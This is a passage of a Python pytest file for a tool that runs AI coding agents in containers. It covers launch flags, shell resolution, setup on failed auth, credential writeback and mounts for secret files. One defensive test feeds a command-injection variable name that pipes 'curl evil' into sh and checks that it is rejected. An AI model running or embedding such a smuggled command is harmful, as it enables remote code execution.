                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ):
                rc = start_detached(None)
            assert rc == 0
            assert m.runtime.run.call_args.kwargs.get("detach") is True
            m.runtime.exec.assert_not_called()


class TestRunStartDetachFlag:
    """`run_start` wiring for --detach/--attach."""

    def _args(self, **over):
        ns = argparse.Namespace(
            project=None, box=None, agent_args=[], entrypoint=None, image=None,
            new_session=False, continue_session=False, resume_session=False,
            autonomous=False, secure=False, model=None, env=None,
            no_helpers=False, no_auto_auth=False, browser=False,
            share_images=False, persistent=False, ephemeral=False,
            detach=None, warm_only=False, agent=None,
        )
        for k, v in over.items():
            setattr(ns, k, v)
        return ns

    def test_detach_flag_routes_to_run_container(self):
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            rc = run_start(self._args(detach=True))
        assert rc == 0
        assert m_run.call_args.kwargs.get("detach") is True
        assert m_run.call_args.kwargs.get("persistent") is True

    def test_default_is_attach(self):
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            run_start(self._args(detach=False))
        assert m_run.call_args.kwargs.get("detach") is False

    def test_detach_with_ephemeral_is_error(self, capsys):
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            rc = run_start(self._args(detach=True, ephemeral=True))
        assert rc == 1
        m_run.assert_not_called()
        assert "cannot be combined with --ephemeral" in capsys.readouterr().err

    def test_explicit_attach_routes_detach_false(self):
        """An EXPLICIT --attach (detach=False) still routes as a foreground/attach
        launch (detach=False) — the tri-state default None must not change this."""
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            run_start(self._args(detach=False))
        assert m_run.call_args.kwargs.get("detach") is False

    def test_warm_only_forces_detach_and_threads_warm_only(self):
        """E2h: --warm-only forces a DETACHED/persistent launch AND threads
        warm_only=True into _run_container.  Mutation-proof: fails if warm_only is
        dropped or detach/persistent is not forced."""
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            rc = run_start(self._args(warm_only=True))
        assert rc == 0
        assert m_run.call_args.kwargs.get("warm_only") is True
        assert m_run.call_args.kwargs.get("detach") is True
        assert m_run.call_args.kwargs.get("persistent") is True

    def test_non_warm_only_threads_warm_only_false(self):
        """REGRESSION GUARD: a normal (non-warm) start threads warm_only=False, so
        the E2b/E2c supervised-agent path is unchanged."""
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            run_start(self._args(detach=True))
        assert m_run.call_args.kwargs.get("warm_only") is False

    def test_warm_only_with_ephemeral_is_error(self, capsys):
        """--warm-only + --ephemeral is a clean error (a background keep-alive vs a
        foreground single-use box), mirroring --detach + --ephemeral."""
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            rc = run_start(self._args(warm_only=True, ephemeral=True))
        assert rc == 1
        m_run.assert_not_called()
        err = capsys.readouterr().err
        assert "--warm-only cannot be combined with --ephemeral" in err

    def test_warm_only_with_explicit_attach_is_error(self, capsys):
        """--warm-only + an EXPLICIT --attach (detach=False) is a clean error: there
        is no CLI agent to attach to on a warm-only box."""
        from kanibako.commands.start import run_start
        with patch(
            "kanibako.commands.start._run_container", return_value=0,
        ) as m_run, patch(
            "kanibako.commands.start._bootstrap_available", return_value=True,
        ):
            rc = run_start(self._args(warm_only=True, detach=False))
        assert rc == 1
        m_run.assert_not_called()
        assert "--warm-only cannot be combined with --attach" in capsys.readouterr().err


class TestRunShellBoxShell:
    """Verify run_shell uses resolve_box_shell for its interactive default."""

    def _args(self, **over):
        ns = argparse.Namespace(
            project=None,
            shell_args=[],
            entrypoint=None,
            image=None,
            no_helpers=False,
            share_images=False,
            env=None,
            persistent=False,
            ephemeral=False,
        )
        for k, v in over.items():
            setattr(ns, k, v)
        return ns

    def test_default_interactive_shell_uses_resolver(self, start_mocks):
        """`kanibako shell` (no args) launches the resolved box.shell, not /bin/bash."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args())
            m_resolve.assert_called_once()
            # Non-persistent shell: resolved shell is the entrypoint.
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/bin/zsh"

    def test_explicit_entrypoint_wins(self, start_mocks):
        """An explicit --entrypoint overrides the resolver."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args(entrypoint="/usr/bin/fish"))
            m_resolve.assert_not_called()
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/usr/bin/fish"

    def test_shell_args_use_one_off_sh_path(self, start_mocks):
        """`kanibako shell -- <cmd>` still uses /bin/sh -c, not the resolver."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args(shell_args=["echo", "hi"]))
            m_resolve.assert_not_called()
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/bin/sh"
            cli_args = m.runtime.run.call_args.kwargs.get("cli_args") or []
            assert cli_args == ["-c", "echo hi"]

    def test_interactive_resolver_gets_runtime_and_image(self, start_mocks):
        """`kanibako shell` resolves the box.shell IMAGE-AWARE (runtime+image)."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/bash", "image"),
            ) as m_resolve:
                run_shell(self._args())
            m_resolve.assert_called_once()
            kwargs = m_resolve.call_args.kwargs
            assert kwargs.get("runtime") is m.runtime
            assert kwargs.get("image") == "test:latest"
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/bin/bash"

    def test_plain_shell_even_when_agent_installed(self, start_mocks):
        """`kanibako shell` gives a PLAIN shell even when an agent is installed.

        box_shell_mode must bypass agent resolution entirely: no resolve_target,
        the launched entrypoint is the resolved shell (not the agent binary), and
        the agent's default_entrypoint ('claude') never appears.
        """
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            # Fixture target is a detectable agent (default_entrypoint='claude').
            # If box_shell_mode leaked into agent mode, resolve_target would run.
            m.resolve_target.side_effect = AssertionError(
                "agent must not be resolved in box_shell_mode"
            )
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args())
            m_resolve.assert_called_once()
            m.resolve_target.assert_not_called()
            assert m.runtime.run.call_args.kwargs.get("entrypoint") == "/bin/zsh"

    def test_shell_bypasses_agent_resolution_with_no_or_many_agents(self, start_mocks):
        """`kanibako shell` reaches the container even when agent resolution
        WOULD fail (0 agents, or 2+ with no default).  box_shell_mode must never
        call config.resolve_agent — so a Gate-2a/2b error can never abort shell."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            # If shell ever resolved an agent it would blow up here.
            m.resolve_agent.side_effect = AssertionError(
                "shell must not resolve an agent"
            )
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ):
                rc = run_shell(self._args())
            assert rc == 0
            m.resolve_agent.assert_not_called()
            m.resolve_target.assert_not_called()

    def test_persistent_wraps_resolved_shell(self, start_mocks):
        """`kanibako shell --persistent` bootstrap-wraps the resolved shell."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args(persistent=True))
            m_resolve.assert_called_once()
            call = m.runtime.run.call_args
            assert call.kwargs.get("entrypoint") == "tmux"
            cli_args = call.kwargs.get("cli_args") or []
            assert cli_args[cli_args.index("--") + 1] == "/bin/zsh"

    def test_interactive_execs_into_running_box(self, start_mocks):
        """An already-running box: `kanibako shell` execs the resolved shell in."""
        from kanibako.commands.start import run_shell
        with start_mocks() as m:
            m.runtime.is_running.return_value = True
            with patch(
                "kanibako.launch.shells.resolve_box_shell",
                return_value=("/bin/zsh", "box.shell"),
            ) as m_resolve:
                run_shell(self._args())
            m_resolve.assert_called_once()
            # Exec path: no fresh run(), exec the concrete resolved shell.
            m.runtime.run.assert_not_called()
            exec_cmd = m.runtime.exec.call_args.args[1]
            assert exec_cmd == ["/bin/zsh"]


class TestInBoxSetupAtAuthProbe:
    """FIX 2: in-box setup runs at the check_auth-FAILURE point (pre-launch).

    When the pre-launch ``check_auth`` probe fails AND the target declares a
    ``setup_entrypoint`` (goose ``configure`` / codex ``login``), _run_container
    runs that command FOREGROUND in the assembled box, then proceeds to the
    normal launch.  A target with no setup command (claude default) keeps the
    existing "Authentication failed" error.  The setup runs AFTER run-config
    assembly (it needs image/mounts/env), not at the bare probe.
    """

    def _drive_setup_target(self, m, *, check_auth=False):
        """Configure the mock target to need an in-box setup like goose."""
        from kanibako.plugins.goose.target import _GOOSE_DESCRIPTOR
        m.target.name = "goose"
        m.target.display_name = "Goose"
        m.target.default_entrypoint = "goose"
        m.target.descriptor = _GOOSE_DESCRIPTOR
        m.target.setting_descriptors.return_value = []
        m.target.setup_entrypoint = "goose"
        m.target.setup_args = ["configure"]
        m.target.check_auth.return_value = check_auth
        m.agent_cfg.state = {}
        m.load_agent_config.return_value = m.agent_cfg

    def _setup_runs(self, m):
        return [
            c for c in m.runtime.run.call_args_list
            if c.kwargs.get("entrypoint") == "goose"
            and c.kwargs.get("cli_args") == ["configure"]
            and c.kwargs.get("detach") is False
        ]

    def test_setup_runs_then_launch_proceeds(self, start_mocks, capsys):
        """check_auth fails + setup declared -> goose configure runs, launch proceeds."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=False)
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, explicit_agent="goose",
            )
            assert self._setup_runs(m), "expected a foreground `goose configure` run"
            # The real (bootstrap-wrapped) launch happened too: a detach=True run.
            launch_runs = [
                c for c in m.runtime.run.call_args_list
                if c.kwargs.get("detach") is True
            ]
            assert launch_runs, "expected the normal launch after setup"
            err = capsys.readouterr().err
            assert "is not configured" in err
            assert rc is not None

    def test_setup_runs_for_ephemeral_launch(self, start_mocks):
        """Non-persistent launch path also runs the in-box setup."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=False)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False, explicit_agent="goose",
            )
            assert self._setup_runs(m)

    def test_setup_crash_fast_fails_no_launch(self, start_mocks, capsys):
        """Refined FIX 2: setup exits NON-ZERO (crashed) -> fast-fail, NO launch.

        The setup command's exit code is a CRASH check only.  A non-zero exit
        means the setup itself failed/aborted, so we never reach the real launch
        — regardless of what the host ``check_auth`` re-probe would say (it is no
        longer consulted on the launch path)."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=False)

            def _run_side(*a, **kw):
                if kw.get("cli_args") == ["configure"]:
                    return 7
                return 0
            m.runtime.run.side_effect = _run_side
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, explicit_agent="goose",
            )
            assert rc == 7
            err = capsys.readouterr().err
            assert "setup did not complete" in err
            # No normal (detach=True) launch after the crash.
            launch_runs = [
                c for c in m.runtime.run.call_args_list
                if c.kwargs.get("detach") is True
            ]
            assert not launch_runs

    def test_setup_exit_zero_proceeds_to_launch(self, start_mocks):
        """Refined FIX 2: setup exits 0 -> proceed to the REAL launch even though
        host ``check_auth`` is still False (box-only config).  The launch — not a
        host re-probe — is the validator."""
        with start_mocks() as m:
            # check_auth stays False (box-only goose config); setup run returns 0.
            self._drive_setup_target(m, check_auth=False)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, explicit_agent="goose",
            )
            assert self._setup_runs(m), "expected the in-box `goose configure` run"
            # The real (detach=True) launch happened despite check_auth False.
            launch_runs = [
                c for c in m.runtime.run.call_args_list
                if c.kwargs.get("detach") is True
            ]
            assert launch_runs, "setup exit 0 must proceed to the real launch"

    def test_no_setup_when_entrypoint_none_keeps_error(self, start_mocks, capsys):
        """claude default: setup_entrypoint is None + check_auth fails -> standard
        'Authentication failed' error, return 1, NO setup run, NO launch."""
        with start_mocks() as m:
            # Default mock target is claude-like; just fail auth, no setup cmd.
            m.target.setup_entrypoint = None
            m.target.check_auth.return_value = False
            rc = _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, explicit_agent="claude",
            )
            assert rc == 1
            err = capsys.readouterr().err
            assert "Authentication failed" in err
            # Errored at the probe BEFORE assembly/launch: runtime.run never ran.
            assert not m.runtime.run.called

    def test_no_setup_when_auth_ok(self, start_mocks):
        """check_auth passes -> no setup run even if a setup command is declared."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=True)
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True, explicit_agent="goose",
            )
            assert not self._setup_runs(m)


class TestPostLaunchSetupDetection:
    """Refined FIX 2: the LAUNCH validates the config (ground truth).

    After the in-box setup runs and the real session launches, the persistent
    post-session log-check site consults ``target.should_run_setup(logs)``.  A
    match means the config did NOT take -> a clear error + return.  BOUNDED:
    setup already ran ONCE this invocation, so the post-launch detection only
    ERRORS — it must NOT loop back into another setup run.
    """

    def _drive_setup_target(self, m, *, check_auth=False):
        from kanibako.plugins.goose.target import _GOOSE_DESCRIPTOR
        m.target.name = "goose"
        m.target.display_name = "Goose"
        m.target.default_entrypoint = "goose"
        m.target.descriptor = _GOOSE_DESCRIPTOR
        m.target.setting_descriptors.return_value = []
        m.target.setup_entrypoint = "goose"
        m.target.setup_args = ["configure"]
        m.target.check_auth.return_value = check_auth
        m.agent_cfg.state = {}
        m.load_agent_config.return_value = m.agent_cfg

    def _setup_runs(self, m):
        return [
            c for c in m.runtime.run.call_args_list
            if c.kwargs.get("entrypoint") == "goose"
            and c.kwargs.get("cli_args") == ["configure"]
            and c.kwargs.get("detach") is False
        ]

    def test_logs_match_errors_with_exactly_one_setup(self, start_mocks, capsys):
        """Launch logs match should_run_setup -> error, return 1, ONE setup run,
        no loop back into setup."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=False)
            # The launched session reports it is still not configured.
            m.target.should_run_setup.return_value = True
            # Force the "container never comes up" branch so logs are inspected.
            m.runtime.run.side_effect = None
            m.runtime.run.return_value = 0
            m.runtime.is_running.return_value = False
            with patch(
                "kanibako.commands.start._container_logs",
                return_value=(
                    "Goose is not configured. Run 'goose configure' to set up."
                ),
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], persistent=True, explicit_agent="goose",
                )
            assert rc == 1
            err = capsys.readouterr().err
            assert "did not produce a working configuration" in err
            # BOUNDED: exactly ONE in-box setup run for the whole invocation.
            assert len(self._setup_runs(m)) == 1, (
                "post-launch detection must NOT loop back into another setup"
            )

    def test_logs_dont_match_normal_success(self, start_mocks, capsys):
        """Launch logs do NOT match should_run_setup -> normal flow (no error)."""
        with start_mocks() as m:
            self._drive_setup_target(m, check_auth=False)
            m.target.should_run_setup.return_value = False
            with patch(
                "kanibako.commands.start._container_logs",
                return_value="goose session started",
            ):
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[], persistent=True, explicit_agent="goose",
                )
            err = capsys.readouterr().err
            assert "did not produce a working configuration" not in err
            assert rc is not None
            # The real launch ran after the single setup.
            launch_runs = [
                c for c in m.runtime.run.call_args_list
                if c.kwargs.get("detach") is True
            ]
            assert launch_runs
            assert len(self._setup_runs(m)) == 1


class TestWritebackAllPaths:
    """FIX 1: project -> host credential writeback fires on EVERY session-end path.

    The descriptor path routes through ``credsync.writeback_box_credentials``
    (mocked in ``start_mocks``), plus the plugin ``writeback_extra`` hook.  The
    real ``_resolve_box_auth_source`` resolves the mock proj to a SHARING tier by
    default; a test patches it to ``_PRIVATE_AUTH`` to assert the gate.
    """

    def test_writeback_on_ephemeral_exit(self, start_mocks):
        with start_mocks() as m:
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False,
            )
            assert m.credsync.writeback_box_credentials.called
            assert m.target.writeback_extra.called
            # GLOBAL tier (_SHARED_AUTH): writeback_extra targets the HOST home
            # (the selected source root == host home for the global tier).
            _, kw = m.target.writeback_extra.call_args
            assert kw["host_home"] == Path.home()

    def test_writeback_extra_routed_to_workset_store(self, start_mocks, tmp_path):
        """MEDIUM #5: for a WORKSET-tier box, writeback_extra (claude's
        .claude.json oauthAccount merge) must target the WORKSET store — NOT host
        home — so the account identity is not leaked to global. With global_sync
        OFF the workset store is the SOLE writeback_extra destination.

        Mutation proof: revert the source-root routing (host_home=Path.home()
        unconditionally) → the assertion that host home is NOT a destination fails.
        """
        ws_store = tmp_path / "ws_auth" / "claude"
        workset_auth = AuthSource(
            tier="workset", global_enabled=True, workset_enabled=True,
            global_sync=False, workset_source=str(ws_store),
        )
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(workset_auth, None, None),
        ):
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False,
            )
            assert m.target.writeback_extra.called
            # Every writeback_extra destination is the WORKSET store, never host
            # home (global_sync OFF → no up-hop to global).
            dests = [
                kw["host_home"] for _, kw in m.target.writeback_extra.call_args_list
            ]
            assert Path(ws_store) in dests
            assert Path.home() not in dests

    def test_writeback_extra_global_sync_mirrors_up(self, start_mocks, tmp_path):
        """WORKSET tier with global_sync ON: writeback_extra hits the workset store
        AND mirrors UP to global (host home) — the bottom-up hop matching the
        cred_files writeback."""
        ws_store = tmp_path / "ws_auth" / "claude"
        workset_auth = AuthSource(
            tier="workset", global_enabled=True, workset_enabled=True,
            global_sync=True, workset_source=str(ws_store),
        )
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(workset_auth, None, None),
        ):
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False,
            )
            dests = [
                kw["host_home"] for _, kw in m.target.writeback_extra.call_args_list
            ]
            assert Path(ws_store) in dests   # box -> workset store
            assert Path.home() in dests      # workset store -> global (up-hop)

    def test_writeback_on_persistent_detach_or_exit(self, start_mocks):
        """Genuine launch then detach/exit (NOT the reattach fast path) ->
        writeback fires.  is_running is False at entry (so we launch, not
        reattach) and the harness flips it True after run() (container up =
        a DETACH return from the attach exec)."""
        with start_mocks() as m:
            # Default harness: is_running False at entry, True after run().
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True,
            )
            assert m.credsync.writeback_box_credentials.called
            assert m.target.writeback_extra.called

    def test_writeback_on_reattach_exit(self, start_mocks):
        """Reattach to an already-running box -> writeback after the attach."""
        with start_mocks() as m:
            # A persistent box already running at entry => reattach fast path.
            m.runtime.is_running.return_value = True
            m.runtime.inspect_env.return_value = "claude"
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True,
            )
            assert m.credsync.writeback_box_credentials.called
            assert m.target.writeback_extra.called

    def test_reattach_prints_config_notice_without_rewriting(
        self, start_mocks, capsys,
    ):
        """D1: reattach to a running box prints the target's
        ``reattach_config_notice`` (codex's restart heads-up) to STDERR and does
        NOT re-deliver / rewrite the live config (deliver_directive_hook is on the
        NON-reattach path)."""
        with start_mocks() as m:
            m.runtime.is_running.return_value = True
            m.target.reattach_config_notice.return_value = "RESTART-TO-APPLY-XYZ"
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True,
            )
        assert "RESTART-TO-APPLY-XYZ" in capsys.readouterr().err
        # reattach fast path never re-delivers the projected config.
        assert not m.target.deliver_directive_hook.called

    def test_reattach_suppresses_notice_when_target_returns_none(
        self, start_mocks, capsys,
    ):
        """An agent whose reattach notice is None (base default) prints nothing
        extra on the reattach path (no name-branching; inherited no-op)."""
        with start_mocks() as m:
            m.runtime.is_running.return_value = True
            m.target.reattach_config_notice.return_value = None
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=True,
            )
        assert "None" not in capsys.readouterr().err

    def test_no_writeback_when_group_auth_false(self, start_mocks):
        """Distinct auth (PRIVATE box, auth_src.creds_shared False) -> NO writeback on
        any path."""
        with start_mocks() as m, patch(
            "kanibako.commands.start._resolve_box_launch_decisions",
            return_value=(_PRIVATE_AUTH, None, None),
        ):
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False,
            )
            assert not m.credsync.writeback_box_credentials.called
            assert not m.target.writeback_extra.called

    def test_writeback_is_best_effort(self, start_mocks):
        """A writeback exception must not crash the teardown path."""
        with start_mocks() as m:
            m.credsync.writeback_box_credentials.side_effect = RuntimeError("boom")
            # Should not raise.
            _run_container(
                project_dir=None, entrypoint=None, image_override=None,
                new_session=False, safe_mode=False, resume_mode=False,
                extra_args=[], persistent=False,
            )


# ---------------------------------------------------------------------------
# Seed at CREATE, never at launch (B7).
#
# The one-time home seed runs ONLY when `proj.is_new` (the box was just
# materialized + registered by this resolve call — registry MEMBERSHIP is the
# seed signal).  `start` on an existing box (is_new False) NEVER seeds.
#
# EXPLICIT-CREATE (Jei 2026-07-11g): a real launch no longer materializes a box,
# so in production ``proj.is_new`` is always False here (the explicit-create gate
# errors out for a non-existent box before this point).  The ``if proj.is_new:``
# seed block is retained as the correct action IF a box were ever materialized on
# this path, and is the seam these unit tests drive with a forced-is_new mock proj.
# ---------------------------------------------------------------------------


class TestLaunchSeedGate:
    """`_run_container` seeds iff ``proj.is_new``; a relaunch never re-seeds."""

    def test_existing_box_launch_does_not_seed(self, start_mocks):
        """A relaunch (proj.is_new False — the fixture default) does NOT seed."""
        with start_mocks() as m:
            assert m.proj.is_new is False
            with patch("kanibako.commands.start._seed_box_home") as m_seed:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_seed.assert_not_called()

    def test_is_new_box_seeds_once(self, start_mocks):
        """The seed seam: a resolve reporting ``is_new`` seeds exactly once.

        (In production the explicit-create gate makes ``is_new`` unreachable on a
        launch — creation goes through ``kanibako create`` — but the forced-is_new
        mock proj here exercises the seed-routing that a materialization would use.)
        """
        with start_mocks() as m:
            m.proj.is_new = True
            with patch("kanibako.commands.start._seed_box_home") as m_seed:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_seed.assert_called_once()

    def test_launch_never_completes_interrupted_create(self, start_mocks):
        """Explicit-create: the launch path no longer resurrects a half-created
        box.  Even with a PENDING create journal entry (and is_new False — the
        existing-box relaunch shape), the launch does NOT seed / register / clear —
        forward-recovery of an interrupted create belongs to ``kanibako create``."""
        with start_mocks() as m:
            m.proj.is_new = False
            # A stale pending create entry would, pre-change, have driven the
            # launch-side "or _pending_create_entry(...)" resurrection.
            m.pending_create_entry.return_value = {
                "op": "create", "name": "testproject",
            }
            with patch("kanibako.commands.start._seed_box_home") as m_seed:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            m_seed.assert_not_called()
            m.register_new_box.assert_not_called()
            m.write_create_entry.assert_not_called()

    def test_relaunch_still_refreshes_credentials(self, start_mocks):
        """The per-launch credsync REFRESH is SEPARATE — it still runs on a
        relaunch even though the one-time seed does not."""
        with start_mocks() as m:
            from kanibako.plugins.claude.target import _CLAUDE_DESCRIPTOR
            m.target.name = "claude"
            m.target.descriptor = _CLAUDE_DESCRIPTOR
            m.target.setting_descriptors.return_value = []
            m.proj.is_new = False
            with patch("kanibako.commands.start.credsync") as m_credsync:
                rc = _run_container(
                    project_dir=None, entrypoint=None, image_override=None,
                    new_session=False, safe_mode=False, resume_mode=False,
                    extra_args=[],
                )
            assert rc == 0
            # No one-time seed on a relaunch...
            m_credsync.seed_box_credentials.assert_not_called()
            # ...but the per-launch refresh still happens.
            m_credsync.refresh_box_credentials.assert_called_once()


class TestSeedNewBoxCreateEntry:
    """`seed_new_box` (the `box create` entry) delegates to `_seed_box_home`.

    The context-building internals (merged config / agent resolve / auth-source
    resolve) are patched out — this asserts the create entry routes to the single
    shared seed implementation with the box it was given.
    """

    def test_delegates_to_seed_box_home(self):
        from kanibako.commands.start import seed_new_box

        std = MagicMock()
        config = MagicMock()
        proj = MagicMock()
        proj.group = None
        with (
            patch("kanibako.commands.start.load_merged_config"),
            patch("kanibako.settings.config.resolve_agent", return_value="claude"),
            patch("kanibako.commands.start.resolve_target") as m_rt,
            patch("kanibako.commands.start.agent_settings_path"),
            patch("kanibako.commands.start.write_agent_config"),
            patch(
                "kanibako.commands.start._resolve_box_launch_decisions",
                return_value=(_SHARED_AUTH, None, None),
            ),
            patch("kanibako.commands.start.load_agent_config"),
            patch("kanibako.commands.start._seed_box_home") as m_seed,
        ):
            m_rt.return_value.name = "claude"
            seed_new_box(std, config, proj)
        m_seed.assert_called_once()
        kwargs = m_seed.call_args.kwargs
        assert kwargs["proj"] is proj
        assert kwargs["std"] is std
        # <None> endpoint → the seed is NOT told to suppress the OAuth cred (bare).
        assert kwargs["suppress_oauth"] is False


class TestEmitSecretMounts:
    """SECRET category (secret_path): arm's-length ro-mount emission + fail-soft.

    ``_emit_secret_mounts`` STATs each pointer (never reads the value) and emits a ro
    Mount to SECRET_MOUNT_DIR/<VAR> + the export VAR list. Missing/unreadable/empty
    ⇒ WARN + VAR dropped (no crash, no export).
    """

    def _logger(self):
        import logging
        return logging.getLogger("test_emit_secret_mounts")

    def _reconciled(self, pointers):
        # Build a reconciled-like object whose .mounts carries secret_path entries
        # exactly as reconcile_categories would (delivery=MOUNT, box_dest fixed).
        from types import SimpleNamespace
        from kanibako.settings.settings_categories import (
            SECRET_MOUNT_DIR,
            CategoryEntry,
        )
        mounts = [
            CategoryEntry(
                category="secret_path", scope="agent",
                box_dest=f"{SECRET_MOUNT_DIR}/{var}", host_src=path,
                delivery="MOUNT", options="ro", name=var,
                key=f"agent.claude.secret_path.{var}",
            )
            for var, path in pointers.items()
        ]
        return SimpleNamespace(mounts=mounts)

    def _call(self, pointers):
        from kanibako.commands.start import _emit_secret_mounts
        return _emit_secret_mounts(self._reconciled(pointers), self._logger())

    def test_present_file_mounts_ro_path_only(self, tmp_path):
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR
        tok = tmp_path / "token"
        tok.write_text("sk-secret-123\n")
        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
        assert len(mounts) == 1
        assert str(mounts[0].source) == str(tok)
        assert mounts[0].destination == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
        assert mounts[0].options == "ro"  # NO :U

    def test_empty_map_is_empty(self):
        assert self._call({}) == ([], [])

    def test_invalid_var_name_skipped_and_warned(self, tmp_path, caplog):
        # DEFENSE-IN-DEPTH (F1): the VAR is interpolated into the generated `sh -c`
        # export shim, so a VAR that bypassed `config set` validation (a hand-edited
        # YAML / a broader settable surface) MUST be rejected fail-soft here — never
        # reaching the shell. A valid VAR alongside it still delivers (per-VAR skip).
        import logging
        from kanibako.settings.settings_categories import SECRET_MOUNT_DIR
        good = tmp_path / "token"
        good.write_text("sk-secret\n")
        evil = tmp_path / "evil"
        evil.write_text("x\n")
        with caplog.at_level(logging.WARNING):
            mounts, exports = self._call({
                "GOOD_TOKEN": str(good),
                "X; curl evil | sh; echo ": str(evil),
            })
        assert exports == ["GOOD_TOKEN"]  # malicious VAR dropped, valid one kept
        assert [m.destination for m in mounts] == [
            f"{SECRET_MOUNT_DIR}/GOOD_TOKEN"
        ]
        assert not any("curl evil" in str(m.destination) for m in mounts)
        assert any("invalid VAR name" in r.getMessage() for r in caplog.records)

    def test_missing_file_var_dropped_no_crash(self, tmp_path, caplog):
        import logging
        missing = tmp_path / "nope" / "token"
        with caplog.at_level(logging.WARNING):
